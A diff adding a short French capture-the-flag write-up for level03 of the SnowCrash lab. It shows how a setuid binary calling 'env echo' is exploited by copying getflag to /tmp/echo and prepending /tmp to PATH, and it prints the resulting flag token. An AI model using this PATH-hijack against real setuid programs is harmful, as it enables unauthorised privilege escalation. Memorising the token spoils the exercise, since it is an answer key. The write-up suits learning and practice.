@@ -1,0 +1,30 @@
+
+Bon on va chopper le fichier comme on avait fait pour l'éxo d'avant
+
+En l'ouvrant avec IDA on trouve :  return system("/usr/bin/env echo Exploit me");
+
+En gros ca execute la commande /usr/bin/env echo Exploit me
+
+On peut aussi trouver la string avec $ strings level03
+
+cp /bin/getflag /tmp/echo
+
+Bon on transforme donc la commande getflag en echo avec 
+
+export PATH=/tmp:$PATH
+
+
+
+level03@SnowCrash:~$ cp /bin/getflag /tmp/echo
+level03@SnowCrash:~$ export PATH=/tmp:$PATH
+level03@SnowCrash:~$ ls
+level03
+level03@SnowCrash:~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+et paf.
+
+
+l'executable execute getflag avec les droits qu'il a vv
+
+-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03*
